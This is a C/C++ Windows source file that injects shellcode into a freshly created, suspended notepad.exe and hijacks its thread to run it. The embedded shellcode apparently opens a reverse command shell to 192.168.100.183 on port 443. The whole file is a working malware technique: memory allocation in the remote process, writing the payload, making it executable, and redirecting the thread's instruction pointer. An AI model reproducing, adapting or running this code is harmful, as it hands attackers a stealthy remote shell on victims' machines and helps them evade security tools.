#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#define _CRT_SECURE_NO_WARNINGS

unsigned char pShellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x64\xb7"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    CHAR				    lpPath[MAX_PATH * 2];
    CHAR				    WnDr[MAX_PATH];

    // 
    STARTUPINFOA			    Si = { 0 };
    PROCESS_INFORMATION		Pi = { 0 };

    // Cleaning the structs by setting the member values to 0
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // Setting the size of the structure
    Si.cb = sizeof(STARTUPINFOA);

    // Getting the value of the %WINDIR% environment variable
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Creating the full target process path
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    printf("\n\t[i] Running : \"%s\" ... ", lpPath);

    if (!CreateProcessA(
        NULL,					// No module name (use command line)
        lpPath,					// Command line
        NULL,					// Process handle not inheritable
        NULL,					// Thread handle not inheritable
        FALSE,					// Set handle inheritance to FALSE
        CREATE_SUSPENDED,		// Creation flag
        NULL,					// Use parent's environment block
        NULL,					// Use parent's starting directory
        &Si,					// Pointer to STARTUPINFO structure
        &Pi)) {					// Pointer to PROCESS_INFORMATION structure

        printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("\n\t[i] Target Process Created with Pid : \"%d\" ... ", Pi.dwProcessId);
    

    // Populating the OUT parameters with CreateProcessA's output
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // Doing a check to verify we got everything we need
    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {


    SIZE_T  sNumberOfBytesWritten = NULL;
    DWORD   dwOldProtection = NULL;


    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);

    printf("\t[#] Press <enter> to write Payload...");
    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("\n\t[i] Successfully  Written %d Bytes", sSizeOfShellcode);

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }


    return TRUE;
}

BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {

    CONTEXT	ThreadCtx;
    ThreadCtx.ContextFlags = CONTEXT_CONTROL;


    // getting the original thread context
    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // updating the next instruction pointer to be equal to our shellcode's address
    ThreadCtx.Rip = reinterpret_cast<DWORD64>(pAddress);

    // setting the new updated thread context
    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("\n\t [#] Press <enter> to run ...");
    getchar();
    // resuming suspended thread, thus running our payload
    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);
    

    printf("[#] Press <enter> to quit ...\n");
    getchar();
    return TRUE;
}

int main() {

    DWORD ProcessId = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID pAddress = NULL;

    CHAR lpProcessName[] = "notepad.exe";


    printf("[i] Creating \"Notepad.exe\" Process ...");
    if(!CreateSuspendedProcess(lpProcessName, &ProcessId, &hProcess,&hThread)) {
        printf("[!] CreateSuspendedProcess failed with %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Done\n\n");

    printf("Writing Shellcode To the Target Process ...");
    if (!InjectShellcodeToRemoteProcess(hProcess, pShellcode, sizeof(pShellcode), &pAddress)) {
        printf("[!] InjectShllcodeToRemoteProcess failed with %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Done\n\n");

    printf("\n[i] Hijacking the target thread to run out Shellcode ...");
    if (!HijackThread(hThread, pAddress)) {
        printf("[!] HijackThread failed with %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Done\n\n");


    return TRUE;

}
